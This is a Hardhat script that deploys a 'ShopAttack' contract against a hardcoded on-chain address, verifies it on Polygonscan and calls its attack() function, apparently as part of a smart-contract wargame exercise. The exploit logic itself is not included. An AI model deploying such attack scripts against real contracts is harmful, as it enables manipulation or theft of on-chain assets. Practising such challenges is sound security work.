import { ethers } from 'hardhat';
import hre from 'hardhat';

async function main() {
  const contract_name = 'ShopAttack';
  const contract_location = 'contracts/Shop.sol:ShopAttack';
  const hackable_contract_address =
    '0x7A2715352Bf2C11F1c5Ec3334D5D06E366eb1501';

  const Contract = await ethers.getContractFactory(contract_name);
  const contract = await Contract.deploy(hackable_contract_address);
  await contract.deployed();

  console.log(
    `Deployed contract to address: ${contract.address} on network: ${hre.network.name}`
  );

  // wait 5 blocks to ensure deployment before verifying
  await contract.deployTransaction.wait(7);

  // verify contract on polygonscan
  await hre.run('verify:verify', {
    address: contract.address,
    contract: contract_location,
    constructorArguments: [hackable_contract_address],
  });

  // Call shop attack with 50000 gas limit
  const tx = await contract.attack({ gasLimit: 50_000 });
  await tx.wait();
  // Print tx hash
  console.log(`Transaction hash: ${tx.hash}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
